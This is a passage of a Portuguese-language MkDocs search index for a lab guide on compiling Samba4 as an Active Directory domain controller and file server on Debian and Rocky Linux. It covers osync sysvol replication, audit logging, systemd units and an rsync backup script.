/etc/osync/sync.conf\n</code></pre>"},{"location":"DC1_pacotes_compilados/#vai-ficar-semelhante-ao-modelo-abaixo_1","title":"Vai ficar semelhante ao modelo abaixo:","text":"<pre><code>#!/usr/bin/env bash\n\nINSTANCE_ID=\"sysvol_sync\"\n\nINITIATOR_SYNC_DIR=\"/opt/samba/var/locks/sysvol\"\n\nTARGET_SYNC_DIR=\"ssh://root@192.168.70.250:22250//opt/samba/var/locks/sysvol\"\n\nSSH_RSA_PRIVATE_KEY=\"/root/.ssh/id_rsa\"\n\nSSH_PASSWORD_FILE=\"\"\n\n_REMOTE_TOKEN=\"SomeAlphaNumericToken9\"\n\nCREATE_DIRS=false\n\nLOGFILE=\"\"\n\nMINIMUM_SPACE=\"10240\"\n\nBANDWIDTH=\"0\"\n\nSUDO_EXEC=false\n\nRSYNC_EXECUTABLE=\"rsync\"\n\nRSYNC_REMOTE_PATH=\"\"\n\nRSYNC_PATTERN_FIRST=\"include\"\n\nRSYNC_INCLUDE_PATTERN=\"\"\n\nRSYNC_EXCLUDE_PATTERN=\"\"\n\nRSYNC_INCLUDE_FROM=\"\"\n\nRSYNC_EXCLUDE_FROM=\"\"\n\nPATH_SEPARATOR_CHAR=\";\"\n\nSSH_COMPRESSION=true\n\nSSH_IGNORE_KNOWN_HOSTS=false\n\nSSH_CONTROLMASTER=false\n\nREMOTE_HOST_PING=false\n</code></pre>"},{"location":"DC1_pacotes_compilados/#testar-o-sincronizmo-ignore-o-erro-de-email","title":"Testar o sincronizmo (ignore o erro de email):","text":"<pre><code>/usr/local/bin/osync.sh /etc/osync/sync.conf --dry --verbose\n</code></pre>"},{"location":"DC1_pacotes_compilados/#rodar-o-sincronizmo-de-fato_1","title":"Rodar o sincronizmo de fato:","text":"<pre><code>/usr/local/bin/osync.sh /etc/osync/sync.conf --verbose\n</code></pre>"},{"location":"DC1_pacotes_compilados/#agendar-no-cron_1","title":"Agendar no cron:","text":"<pre><code>crontab -e\n</code></pre> <pre><code>*/5 * * * * root  bash /usr/local/bin/osync.sh /etc/osync/sync.conf --silent\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-os-logs-em-tempo-real-rode-o-usrlocalbinosyncsh-mantendo-outro-terminal-aberto-com-o-comando_1","title":"Validando os logs em tempo real, rode o /usr/local/bin/osync.sh, mantendo outro terminal aberto com o comando:","text":"<pre><code>tail -f /var/log/osync.sysvol_sync.log\n</code></pre> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"DC1_pacotes_compilados/#fileserver-com-samba4-no-debian-linux-13","title":"FileServer com Samba4 no Debian Linux 13","text":""},{"location":"DC1_pacotes_compilados/#layout-de-rede-usado-no-laboratorio_2","title":"Layout de rede usado no laborat\u00f3rio:","text":"<pre><code>firewall           192.168.70.254 (enp1s0) - 192.168.122.254 (enp7s0) (ssh 2277)\ndcmaster           192.168.70.250   (ssh 22250)\nmkdocs             192.168.70.222   (ssh 22222)\ndcslave            192.168.70.200   (ssh 22200)\nfileserver         192.168.70.150   (ssh 22100)\n\n; firewall         Roteamento por Iptables\n; dcmaster         Controlador de Dom\u00ednio prim\u00e1rio\n; mkdocs           Servidor de Documentos\n; dcslave          Controlador de Dom\u00ednio secund\u00e1rio\n; fileserver       Servidor de Arquivos\n</code></pre>"},{"location":"DC1_pacotes_compilados/#instalando-as-dependencias-para-compilacao-do-codigo-fonte-do-samba4_2","title":"Instalando as depend\u00eancias para compila\u00e7\u00e3o do c\u00f3digo fonte do Samba4:","text":"<pre><code>export DEBIAN_FRONTEND=noninteractive;apt-get update; apt-get install vim ntp net-tools rsync acl apt-utils attr autoconf bind9-utils binutils bison build-essential ntp rsync ccache chrpath curl debhelper bind9-dnsutils docbook-xml docbook-xsl flex gcc gdb git glusterfs-common gzip heimdal-multidev hostname htop krb5-config krb5-user lcov libacl1-dev libarchive-dev libattr1-dev libavahi-common-dev libblkid-dev libbsd-dev libcap-dev libcephfs-dev libcups2-dev libdbus-1-dev libglib2.0-dev libgnutls28-dev libgpgme-dev libicu-dev libjansson-dev libjs-jquery libjson-perl libkrb5-dev libldap2-dev liblmdb-dev libncurses-dev libpam0g-dev libparse-yapp-perl libpcap-dev libpopt-dev libreadline-dev libsystemd-dev libtasn1-bin libtasn1--5-dev libunwind-dev lmdb-utils locales lsb-release make mawk mingw-w64 patch perl perl-modules-5.40 pkg-config procps psmisc python3 python3-cryptography python3-dbg python3-dev python3-dnspython python3-gpg python3-iso8601 python3-markdown python3-matplotlib python3-pexpect python3-pyasn1 rsync sed  tar tree uuid-dev wget xfslibs-dev xsltproc zlib1g-dev -y\n</code></pre>"},{"location":"DC1_pacotes_compilados/#setando-e-validando-o-hostname-do-dcslave_1","title":"Setando e validando o hostname do dcslave:","text":"<pre><code>vim /etc/hostname\n</code></pre> <pre><code>fileserver\n</code></pre> <pre><code>hostname -f\n</code></pre> <pre><code>fileserver.officinas.edu\n</code></pre>"},{"location":"DC1_pacotes_compilados/#configurando-o-arquivo-de-hosts_2","title":"Configurando o arquivo de hosts:","text":"<pre><code>vim /etc/hosts\n</code></pre> <pre><code>.0.0.1              localhost\n127.0.1.1           fileserver.officinas.edu    fileserver\n192.168.70.150      fileserver.officinas.edu    fileserver\n192.168.70.200      dcslave.officinas.edu       dcslave\n192.168.70.222      mkdocs.officinas.edu        mkdocs\n192.168.70.250      dcmaster.officinas.edu      dcmaster\n192.168.70.254      firewall.officinas.edu      firewall\n</code></pre>"},{"location":"DC1_pacotes_compilados/#setando-ip-fixo-no-servidor-dcslave_1","title":"Setando ip fixo no servidor dcslave:","text":"<pre><code>vim /etc/network/interfaces\n</code></pre> <pre><code>allow-hotplug enp1s0\niface enp1s0 inet static\naddress           192.168.70.150\nnetmask           255.255.255.0\ngateway           192.168.70.254\n</code></pre>"},{"location":"DC1_pacotes_compilados/#apontando-o-endereco-do-resolvedor-de-nomes-principal-da-rede-pro-controlador-de-dominio-primario-dcmaster-temporario","title":"Apontando o endere\u00e7o do resolvedor de nomes principal da rede pro Controlador de dom\u00ednio prim\u00e1rio, dcmaster (tempor\u00e1rio):","text":"<pre><code>vim /etc/resolv.conf\n</code></pre> <pre><code>domain           officinas.edu\nsearch           officinas.edu.\nnameserver       192.168.70.250 #(dcmaster)\nnameserver       192.168.70.200 #(dcslave)\n</code></pre>"},{"location":"DC1_pacotes_compilados/#bloqueando-alteracao-do-resolvconf_1","title":"Bloqueando altera\u00e7\u00e3o do resolv.conf:","text":"<pre><code>chattr +i /etc/resolv.conf\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-a-resolucao-de-nomes-pelo-dcmaster_1","title":"Validando a resolu\u00e7\u00e3o de nomes pelo dcmaster:","text":"<pre><code>nslookup officinas.edu\n</code></pre> <pre><code>Server:         192.168.70.250\nAddress:        192.168.70.250#53\n\nName:   officinas.edu\nAddress: 192.168.70.250\nName:   officinas.edu\nAddress: 192.168.70.200\n</code></pre>"},{"location":"DC1_pacotes_compilados/#relendo-as-configuracoes-de-rede_1","title":"Relendo as configura\u00e7\u00f5es de rede:","text":"<pre><code>systemctl restart networking\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-o-ip-da-placa_2","title":"Validando o ip da placa:","text":"<pre><code>ip -c addr\n</code></pre> <pre><code>ip -br link\n</code></pre>"},{"location":"DC1_pacotes_compilados/#baixando-e-compilando-o-codigo-fonte-do-samba4_2","title":"Baixando e compilando o c\u00f3digo fonte do Samba4:","text":"<pre><code>wget https://download.samba.org/pub/samba/samba-4.19.4.tar.gz\n</code></pre> <pre><code>tar -xvzf samba-4.19.4.tar.gz\n</code></pre> <pre><code>cd samba-4.19.4\n</code></pre> <pre><code>./configure --prefix=/opt/samba\n</code></pre> <pre><code>make &amp;&amp; make install\n</code></pre>"},{"location":"DC1_pacotes_compilados/#adicionando-optsamba-ao-path-padrao-do-linux-colando-a-linha-completa-ao-final-do-bashrc_2","title":"Adicionando /opt/Samba ao path padr\u00e3o do Linux, colando a linha completa ao final do .bashrc:","text":""},{"location":"DC1_pacotes_compilados/#pathusrlocalsbinusrlocalbinusrsbinusrbinsbinbinoptsambabinoptsambasbin_2","title":"PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/samba/bin:/opt/samba/sbin\"","text":"<pre><code>vim ~/.bashrc\n</code></pre> <pre><code>PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/samba/bin:/opt/samba/sbin\"\n</code></pre>"},{"location":"DC1_pacotes_compilados/#relendo-o-arquivo-de-profile_2","title":"Relendo o arquivo de profile:","text":"<pre><code>source ~/.bashrc\n</code></pre>"},{"location":"DC1_pacotes_compilados/#criando-o-daemon-de-inicializacao-do-samba4-com-o-sistema_2","title":"Criando o daemon de inicializa\u00e7\u00e3o do Samba4 com o sistema:","text":"<pre><code>vim /etc/systemd/system/samba-ad-dc.service\n</code></pre> <pre><code>[Unit]\n   Description=Samba4 Active Directory Slave Domain Controller\n   After=network.target remote-fs.target nss-lookup.target\n\n[Service]\n   Type=forking\n   ExecStart=/opt/samba/sbin/samba -D\n   PIDFile=/opt/samba/var/run/samba.pid\n\n[Install]\n   WantedBy=multi-user.target\n</code></pre> <pre><code>chmod +x /etc/systemd/system/samba-ad-dc.service\n</code></pre>"},{"location":"DC1_pacotes_compilados/#configurando-o-servico-de-sincronizacao-de-horario-apontando-pro-controlador-de-dominio-primario-dcmaster_1","title":"Configurando o servi\u00e7o de sincroniza\u00e7\u00e3o de hor\u00e1rio, apontando pro Controlador de dom\u00ednio prim\u00e1rio, dcmaster:","text":"<pre><code>mv /etc/ntpsec/ntp.conf{,.orig}\n</code></pre> <pre><code>vim /etc/ntpsec/ntp.conf\n</code></pre> <pre><code>driftfile /var/lib/ntpsec/ntp.drift\nleapfile /usr/share/zoneinfo/leap-seconds.list\ntos minclock 4 minsane 3\npool 192.168.70.250 iburst #(dcmaster)\nrestrict default kod nomodify nopeer noquery limited\nrestrict 127.0.0.1\nrestrict ::1\ntinker panic 0 #(Usado SOMENTE em VMs)\n</code></pre> <pre><code>systemctl restart ntp\n</code></pre> <pre><code>ntpq -p\n</code></pre> <pre><code>date\n</code></pre>"},{"location":"DC1_pacotes_compilados/#atencao-nao-provisione-o-samba-do-fileserver","title":"ATEN\u00c7\u00c3O!! N\u00c3O PROVISIONE O SAMBA DO FILESERVER!!","text":"<p>Aten\u00e7\u00e3o</p> <p>N\u00e3o provisione o Fileserver.</p>"},{"location":"DC1_pacotes_compilados/#atencao-nao-provisione-o-samba-do-fileserver_1","title":"ATEN\u00c7\u00c3O!! N\u00c3O PROVISIONE O SAMBA DO FILESERVER!!","text":""},{"location":"DC1_pacotes_compilados/#_1","title":"DC-1 Pacotes Compilados","text":""},{"location":"DC1_pacotes_compilados/#configurando-o-etckrb5conf","title":"Configurando o /etc/krb5.conf:","text":"<pre><code># vim /etc/krb5.conf\n</code></pre> <pre><code>[libdefaults] #(sem espa\u00e7o no canto dessa linha)\n   dns_lookup_realm = false\n   dns_lookup_kdc = true\n   default_realm = OFFICINAS.EDU\n</code></pre>"},{"location":"DC1_pacotes_compilados/#configurando-o-time-server","title":"Configurando o time server:","text":"<pre><code>apt-get install ntp ntpdate -y\n</code></pre> <pre><code>nano /etc/ntpsec/ntp.conf\n</code></pre> <pre><code># Rel\u00f3gio Local ( Nota: Este n\u00e3o \u00e9 o endere\u00e7o localhost! )\n   server 127.127.1.0\n   fudge  127.127.1.0 stratum 10\n   server 192.168.70.250 iburst prefer #(dcmaster)\n   driftfile /var/lib/ntp/ntp.drift\n   logfile   /var/log/ntp\n   restrict default ignore\n   restrict 127.0.0.1\n   restrict 192.168.70.250   mask 255.255.255.255    nomodify notrap nopeer noquery\n</code></pre> <pre><code>systemctl restart ntp\n</code></pre> <pre><code>ntpq -p\n</code></pre> <pre><code>date\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-mapeamentos","title":"Validando mapeamentos:","text":"<pre><code>getent hosts fileserver\n</code></pre>"},{"location":"DC1_pacotes_compilados/#configurando-o-smbconf","title":"Configurando o smb.conf:","text":"<pre><code># vim /opt/samba/etc/smb.conf\n</code></pre> <pre><code># Define as informa\u00e7\u00f5es do dom\u00ednio.\n   [global]\n   workgroup = OFFICINAS\n   realm = officinas.edu\n\n# Define que esse servidor n\u00e3o aceita acesso sem autentica\u00e7\u00e3o.\n    security = ADS\n\n# Defique qual usu\u00e1rio no dom\u00ednio se equivale ao root.\n    username map = /opt/samba/etc/user.map\n\n# Par\u00e2metros para que as permiss\u00f5es se comportem como o Windows.\n# Herdando permiss\u00f5es e guardando credenciais de logins bem-sucedidos.\n    map acl inherit = yes\n    store dos attributes = yes\n\n# Os VFS objects que ser\u00e3o usados.\n    vfs objects = acl_xattr acl_tdb\n\n# Arquivo de configura\u00e7\u00e3o do kerberos e qual m\u00e9todo ser\u00e1 usado.\n    dedicated keytab file = /etc/krb5.keytab\n    kerberos method = secrets and keytab\n\n# Configura\u00e7\u00f5es do backend para mapeamento de IDs para compatibilidade com Windows.\n    idmap config * : backend = tdb\n    idmap config * : range = 3000-7999\n    idmap config OFFICINAS: backend = rid\n    idmap config OFFICINAS: range = 10000-999999\n\n# Define que o usu\u00e1rio root n\u00e3o precisa ser mapeado.\n    min domain uid = 0\n\n# Shell padr\u00e3o e diret\u00f3rio home padr\u00e3o.\n    template shell = /bin/bash\n    template homedir = /home/%U\n\n# Define o comportamento do Winbind.\n    winbind refresh tickets = yes\n    winbind use default domain = yes\n    winbind enum users = yes\n    winbind enum groups = yes\n    winbind cache time = 7200\n    winbind nss info = rfc2307\n\n# Cada escrita  de dados ser\u00e1 seguida por um fsync() para garantir que os dados sejam gravados no disco. Usei em ext4 e xfs mas n\u00e3o testei no btrfs.\n   sync always = yes\n   strict sync = yes\n\n# Onde ser\u00e3o gravados os logs e o nivel de detalhes.\n   log file = /var/log/samba/%m.log\n   log level = 3\n\n   [FILESERVER]\n   path = /home/fileserver\n   comment = Compartilhamentos da Rede\n   read only = No\n   browseable = yes\n   vfs objects = acl_xattr acl_tdb full_audit\n   full_audit:success = renameat rewinddir unlinkat\n   full_audit:prefix = %U|%I|%S\n   full_audit:failure = none\n   full_audit:facility = local4\n   full_audit:priority = alert\n\n# PAR\u00c2METROS USADOS NA AUDITORIA:\n# Adiciona todos os vfs objects.\n    acl_xattr acl_tdb full_audit\n# arquivos renomeados, diret\u00f3rios renomeados, arquivos deletados.\n    renameat rewinddir unlinkat\n# usu\u00e1rio, ip, a\u00e7\u00e3o.\n    %U|%I|%S\n</code></pre> <pre><code> restart.samba\n</code></pre> <p>o Samba instalado em /opt/samba/ pode n\u00e3o ter permiss\u00e3o para gravar diretamente em /var/log/samba</p> <pre><code>mkdir -p /var/log/samba\nchown root:root /var/log/samba\nchmod 755 /var/log/samba\n</code></pre> <p>Ou aponte para um diret\u00f3rio interno, como:</p> <pre><code>log file = /opt/samba/var/logs/%m.log\n</code></pre>"},{"location":"DC1_pacotes_compilados/#auditando-arquivos-deletados","title":"Auditando arquivos deletados:","text":"<pre><code>cat /var/log/syslog | grep unlinkat\n</code></pre> <pre><code>tail -f /var/log/syslog | grep unlinkat #(Teste em tempo real).\n</code></pre>"},{"location":"DC1_pacotes_compilados/#criando-o-diretorio-da-rede","title":"Criando o diret\u00f3rio da rede:","text":"<pre><code>mkdir /home/fileserver\n</code></pre> <pre><code>chmod -R 0770 /home/fileserver\n</code></pre> <pre><code>chown -R root:\"domain admins\" /home/fileserver\n</code></pre> <pre><code>getfacl /home/fileserver\n</code></pre>"},{"location":"DC1_pacotes_compilados/#extra-se-optar-por-uso-de-perfil-movel","title":"EXTRA! SE optar por uso de perfil m\u00f3vel:","text":"<pre><code>mkdir /opt/samba/var/lib/samba/profiles\n</code></pre> <pre><code>chmod -R 0770 /opt/samba/var/lib/samba/profiles\n</code></pre> <pre><code>chown -R root:\"domain admins\" /opt/samba/var/lib/samba/profiles\n</code></pre>"},{"location":"DC1_pacotes_compilados/#adicionando-o-path-do-optsambaetcsmbconf","title":"Adicionando o path do /opt/samba/etc/smb.conf:","text":""},{"location":"DC1_pacotes_compilados/#linkando-as-bibliotecas-para-mapeamento-de-usuarios-de-sistema-local-e-samba4","title":"Linkando as bibliotecas para mapeamento de usu\u00e1rios de sistema local e Samba4:","text":"<pre><code>/opt/samba/sbin/smbd -b | grep LIBDIR\n</code></pre> <pre><code>ln -s /opt/samba/lib/libnss_winbind.so.2 /lib/x86-64-linux-gnu\n</code></pre> <pre><code>ln -s /lib/x86_64-linux-gnu/libnss_winbind.so.2 /lib/x86_64-linux-gnu/libnss_winbind.so\n</code></pre> <pre><code>ldconfig\n</code></pre> <pre><code>vim /etc/nsswitch.conf\n</code></pre> <pre><code>   passwd: files winbind\n   group: files winbind\n   shadow: files\n</code></pre>"},{"location":"DC1_pacotes_compilados/#dando-poderes-de-root-ao-administrator_1","title":"Dando poderes de root ao Administrator:","text":"<pre><code>nano /opt/samba/etc/user.map\n</code></pre> <pre><code>!root=officinas.edu\\Administrator\n</code></pre>"},{"location":"DC1_pacotes_compilados/#criando-o-diretorio-de-logs","title":"Criando o diret\u00f3rio de logs:","text":"<pre><code>mkdir /var/log/samba\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-a-troca-de-tickets-do-kerberos_2","title":"Validando a troca de tickets do Kerberos:","text":"<pre><code>kinit Administrator\n</code></pre> <pre><code>klist\n</code></pre>"},{"location":"DC1_pacotes_compilados/#ingressando-o-fileserver-ao-dominio","title":"Ingressando o Fileserver ao dom\u00ednio:","text":"<pre><code>net ads join -U Administrator\n</code></pre>"},{"location":"DC1_pacotes_compilados/#subindo-os-servicos-ao-boot-do-sistema","title":"Subindo os servi\u00e7os ao boot do Sistema:","text":"<pre><code>/opt/samba/sbin/smbd &amp;&amp; /opt/samba/sbin/nmbd &amp;&amp; /opt/samba/sbin/winbindd\n</code></pre>"},{"location":"DC1_pacotes_compilados/#adicionando-o-smbd-ao-boot-do-linux","title":"Adicionando o smbd ao boot do Linux:","text":"<pre><code>cd /etc/systemd/system\n</code></pre> <pre><code>vim smbd.service\n</code></pre> <pre><code>   [Unit]\n   Description=Samba SMBD FileServer\n   After=network.target remote-fs.target nss-lookup.target\n   [Service]\n   Type=forking\n   ExecStart=/opt/samba/sbin/smbd\n   PIDFile=/opt/samba/var/run/smbd.pid\n   [Install]\n   WantedBy=multi-user.target\n</code></pre>"},{"location":"DC1_pacotes_compilados/#adicionando-o-nmbd-ao-boot-do-linux","title":"Adicionando o nmbd ao boot do Linux:","text":"<pre><code>cd /etc/systemd/system\n</code></pre> <pre><code>vim nmbd.service\n</code></pre> <pre><code>   [Unit]\n   Description=Samba NMBD FileServer\n   After=network.target remote-fs.target nss-lookup.target\n   [Service]\n   Type=forking\n   ExecStart=/opt/samba/sbin/nmbd\n   PIDFile=/opt/samba/var/run/nmbd.pid\n   [Install]\n   WantedBy=multi-user.target\n</code></pre>"},{"location":"DC1_pacotes_compilados/#adicionando-o-nmbd-ao-boot-do-linux_1","title":"Adicionando o nmbd ao boot do Linux:","text":"<pre><code>cd /etc/systemd/system\n</code></pre> <pre><code>vim winbindd.service\n</code></pre> <pre><code>   [Unit]\n   Description=Samba WINBIND FileServer\n   After=network.target remote-fs.target nss-lookup.target\n   [Service]\n   Type=forking\n   ExecStart=/opt/samba/sbin/winbindd\n   PIDFile=/opt/samba/var/run/winbindd.pid\n   [Install]\n   WantedBy=multi-user.target\n</code></pre> <pre><code>systemctl enable smbd.service nmbd.service winbindd.service\n</code></pre> <pre><code>pkill smb &amp;&amp; pkill nmb &amp;&amp; pkill winbind\n</code></pre> <pre><code>systemctl start smbd.service nmbd.service winbindd.service\n</code></pre> <pre><code>echo \"systemctl start smbd.service nmbd.service winbindd.service\" &gt; /sbin/start.samba\n</code></pre> <pre><code>echo \"systemctl stop smbd.service nmbd.service winbindd.service\" &gt; /sbin/stop.samba\n</code></pre> <pre><code>echo \"systemctl restart smbd.service nmbd.service winbindd.service\" &gt; /sbin/restart.samba\n</code></pre> <pre><code>chmod +x /sbin/*.samba\n</code></pre>"},{"location":"DC1_pacotes_compilados/#facilitando-o-boot-dos-servicos","title":"Facilitando o boot dos servi\u00e7os:","text":"<pre><code>echo \"systemctl start smbd.service nmbd.service winbindd.service\" &gt; /sbin/start.samba\n</code></pre> <pre><code>echo \"systemctl stop smbd.service nmbd.service winbindd.service\" &gt; /sbin/stop.samba\n</code></pre> <pre><code>echo \"systemctl restart smbd.service nmbd.service winbindd.service\" &gt; /sbin/restart.samba\n</code></pre> <pre><code>chmod +x /sbin/*.samba\n</code></pre>"},{"location":"DC1_pacotes_compilados/#responde-agora-com","title":"Responde agora com:","text":"<pre><code>start.samba, restart.samba e stop.samba\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-wbinfo-e-getent","title":"Validando wbinfo e getent:","text":"<pre><code>wbinfo --ping-dc\n</code></pre> <pre><code>wbinfo -u\n</code></pre> <pre><code>wbinfo -g\n</code></pre> <pre><code>getent passwd Administrator\n</code></pre> <pre><code>getent group \"domain admins\"\n</code></pre>"},{"location":"DC1_pacotes_compilados/#criando-o-script-de-backup-do-homefileserver","title":"Criando o script de backup do /home/fileserver:","text":"<pre><code>mkdir /media/HDEXTERNO\n</code></pre> <pre><code>vim /opt/samba/bkpdiario.sh\n</code></pre> <pre><code>#!/bin/bash\n   INICIO=`date +%d/%m/%Y-%H:%M:%S`\n   LOG=/var/log/samba/bkpfileserver_`date +%Y-%m-%d`.txt\n   echo \" \" &gt;&gt; $LOG\n   echo \" \" &gt;&gt; $LOG\n   echo \"|-----------------------------------------------\" &gt;&gt; $LOG\n   echo \" Sincronizacao iniciada em $INICIO\" &gt;&gt; $LOG\n   umount /media/HDEXTERNO\n   mount /dev/sdb1 /media/HDEXTERNO\n   rsync --delete -P -r -z -v /home/fileserver /media/HDEXTERNO/ &gt;&gt; $LOG\n   FINAL=`date +%d/%m/%Y-%H:%M:%S`\n   umount /media/HDEXTERNO\n   echo \" Sincronizacao Finalizada em $FINAL\" &gt;&gt; $LOG\n   echo \"|-----------------------------------------------\" &gt;&gt; $LOG\n   echo \" \" &gt;&gt; $LOG\n   echo \" \" &gt;&gt; $LOG\n</code></pre>"},{"location":"DC1_pacotes_compilados/#adicionando-o-script-ao-crontab","title":"Adicionando o script ao crontab:","text":"<pre><code>vim /etc/crontab\n</code></pre> <pre><code># Rotinas de backup di\u00e1rio do SAMBA4.\n# Minuto/Hora/Dia/M\u00eas/Dia_semana/Usu\u00e1rio/Comando\n   45 23 * * 1-5 root /opt/samba/bkpdiario.sh  &gt; /dev/null 2&gt;&amp;1\n</code></pre>"},{"location":"DC1_pacotes_compilados/#vai-montar-o-hd-externo-fazer-o-backup-e-desmontar-o-hd-externo","title":"VAI MONTAR O HD EXTERNO, FAZER O BACKUP E DESMONTAR O HD EXTERNO!","text":"<p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"DC2_Rocky/","title":"\ud83d\udcc1 DC2 Rocky","text":""},{"location":"DC2_Rocky/#controlador-de-dominio-secundario-no-rocky-linux-9","title":"Controlador de Dom\u00ednio Secund\u00e1rio no Rocky Linux 9","text":"<p>Update do sistema: <pre><code>yum update -y &amp;&amp; yum upgrade -y\n</code></pre></p> <p>Instalar o editor de texto nano: <pre><code>dnf install nano\n</code></pre> Adicionar um usu\u00e1rio para que o mesmo seja utilizado como replicador do sysvol (backup do ad-dc DC1) <pre><code>useradd userdc2\n</code></pre> Adicionar senha para o usu\u00e1rio criado: <pre><code>passwd userdc2\n</code></pre> Insira uma senha para o usu\u00e1rio criado. Guarde a senha</p> <p>Verificar sua configura\u00e7\u00e3o de rede e DNS, bem como nome de dom\u00ednio. Uma das formas: Abra um terminal e chamar o nmtui: <pre><code> nmtui\n</code></pre> Selecione Editar uma conex\u00e3o. Ent\u00e3o a op\u00e7\u00e3o Editar. Verificar ou alterar seu endere\u00e7o ip e m\u00e1scara de sub-rede e seu Gateway. </p> <p>Na op\u00e7\u00e3o Servidor DNS: inserir PREFERENCIALMENTE o ip de seu Controlador de Dom\u00ednio Principal (seu DC1).</p> <p>N\u00e3o esquecer de inserir em Dom\u00ednios de pesquisa: seu.dom\u00ednio. V\u00e1 at\u00e9 o fim e selecione OK para salvar. Selecione Voltar e ent\u00e3o no menu, selecionar a op\u00e7\u00e3o: </p> <p>Definir nome de m\u00e1quina do sistema: dc2.seu.dominio. Agora selecione a op\u00e7\u00e3o: OK para salvar. Novamente selecione OK. Deve retornar para o terminal.</p> <p>Editar o arquivo /etc\u00a0/host: <pre><code>nano /etc/hosts\n</code></pre></p> <p>Inserir os dados referentes ao seu servidor de Controlador de Dom\u00ednio 2: <pre><code>127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4\n::1         localhost localhost.localdomain localhost6 localhost6.localdomain6\n# inserir os dados de seu server\n10.1.1.38   dc2                             dc2.seu.dominio\n</code></pre> Salvar o arquivo</p> <p>Veririficar se existe algum processo do samba rodando: <pre><code> ps ax | egrep \"samba|smbd|nmbd|winbindd\"\n</code></pre></p> <p>Remover qualquer configura\u00e7\u00e3o smb.conf que houver, checando com o comando: <pre><code># smbd -b | grep \"CONFIGFILE\"\n   CONFIGFILE: /usr/local/samba/etc/samba/smb.conf\n</code></pre></p> <p>Remover todos arquivos de data base que houver. como .tdb* e .ldb*, listando com o comando: <pre><code># smbd -b | egrep \"LOCKDIR|STATEDIR|CACHEDIR|PRIVATE_DIR\"\n  LOCKDIR: /usr/local/samba/var/lock/\n  STATEDIR: /usr/local/samba/var/locks/\n  CACHEDIR: /usr/local/samba/var/cache/\n  PRIVATE_DIR: /usr/local/samba/private/\n</code></pre></p> <p>Remover o arquivo /etc/krb5.conf se houver, com o comando: <pre><code>rm /etc/krb5.conf\n</code></pre></p> <p>Instalar plugins e habilitar reposit\u00f3rio PowerTools com os comandos abaixo: <pre><code>dnf install dnf-plugins-core\ndnf install epel-release\ndnf config-manager --set-enabled powertools\ndnf update\n</code></pre></p> <p>Checar os reposit\u00f3rios adicionados com o comando: <pre><code>dnf repolist\n</code></pre></p> <p>O resultado deve ser algo como: <pre><code>id do repo nome do repo\nappstream Rocky Linux 8 - AppStream\nbaseos Rocky Linux 8 - BaseOS\ndevel Rocky Linux 8 - Devel WARNING! FOR BUILDROOT AND KOJI USE\n\n- epel Extra Packages for Enterprise Linux 8 - x86_64\n- extras Rocky Linux 8 - Extras\n- powertools Rocky Linux 8 - PowerTools\n</code></pre></p>"},{"location":"DC2_Rocky/#setar-a-hora-local","title":"Setar a hora local:","text":"<p>Listando as op\u00e7\u00f5es de hora local. <pre><code>timedatectl list-timezones\n</code></pre></p> <p>Para setar o timezone desejado, usar o comando:\u00a0 <pre><code>timedatectl set-timezone America/Sao_Paulo \n</code></pre></p> <p>Verificando o timezone setado: <pre><code>timedatectl\n\nLocal time: qua 2023-04-12 09:04:22 -03\n           Universal time: qua 2023-04-12 12:04:22 UTC\n                 RTC time: qua 2023-04-12 12:00:16\n                Time zone: America/Sao_Paulo (-03, -0300)\nSystem clock synchronized: yes\n              NTP service: active\n          RTC in local TZ: no\n</code></pre></p> <p>Instalar as depend\u00eancias dos pacotes para instalar e compilar o samba AD-DC. No terminal fazer um arquivo do tipo script execut\u00e1vel e inserir os comandos: <pre><code>nano depende.sh\n</code></pre></p> <p>Inserir os comandos: <pre><code>set -xueo pipefail\n\nyum update -y\nyum install -y dnf-plugins-core\nyum install -y epel-release\n\nyum -v repolist all\nyum config-manager --set-enabled PowerTools -y || \\\n    yum config-manager --set-enabled powertools -y\nyum config-manager --set-enabled Devel -y || \\\n    yum config-manager --set-enabled devel -y\nyum update -y\n\nyum install -y \\\n    --setopt=install_weak_deps=False \\\n    \"@Development Tools\" \\\n    acl \\\n    attr \\\n    autoconf \\\n    avahi-devel \\\n    bind-utils \\\n    binutils \\\n    bison \\\n    ccache \\\n    chrpath \\\n    cups-devel \\\n    curl \\\n    dbus-devel \\\n    docbook-dtds \\\n    docbook-style-xsl \\\n    flex \\\n    gawk \\\n    gcc \\\n    gdb \\\n    git \\\n    glib2-devel \\\n    glibc-common \\\n    glibc-langpack-en \\\n    glusterfs-api-devel \\\n    glusterfs-devel \\\n    gnutls-devel \\\n    gpgme-devel \\\n    gzip \\\n    hostname \\\n    htop \\\n    jansson-devel \\\n    keyutils-libs-devel \\\n    krb5-devel \\\n    krb5-server \\\n    libacl-devel \\\n    libarchive-devel \\\n    libattr-devel \\\n    libblkid-devel \\\n    libbsd-devel \\\n    libcap-devel \\\n    libcephfs-devel \\\n    libicu-devel \\\n    libnsl2-devel \\\n    libpcap-devel \\\n    libtasn1-devel \\\n    libtasn1-tools \\\n    libtirpc-devel \\\n    libunwind-devel \\\n    libuuid-devel \\\n    libxslt \\\n    lmdb \\\n    lmdb-devel \\\n    make \\\n    mingw64-gcc \\\n    ncurses-devel \\\n    openldap-devel \\\n    pam-devel \\\n    patch \\\n    perl \\\n    perl-Archive-Tar \\\n    perl-ExtUtils-MakeMaker \\\n    perl-JSON \\\n    perl-Parse-Yapp \\\n    perl-Test-Simple \\\n    perl-generators \\\n    perl-interpreter \\\n    pkgconfig \\\n    popt-devel \\\n    procps-ng \\\n    psmisc \\\n    python3 \\\n    python3-cryptography \\\n    python3-devel \\\n    python3-dns \\\n    python3-gpg \\\n    python3-iso8601 \\\n    python3-libsemanage \\\n    python3-markdown \\\n    python3-policycoreutils \\\n    python3-pyasn1 \\\n    python3-setproctitle \\\n    quota-devel \\\n    readline-devel \\\n    redhat-lsb \\\n    rng-tools \\\n    rpcgen \\\n    rpcsvc-proto-devel \\\n    rsync \\\n    sed \\\n    sudo \\\n    systemd-devel \\\n    tar \\\n    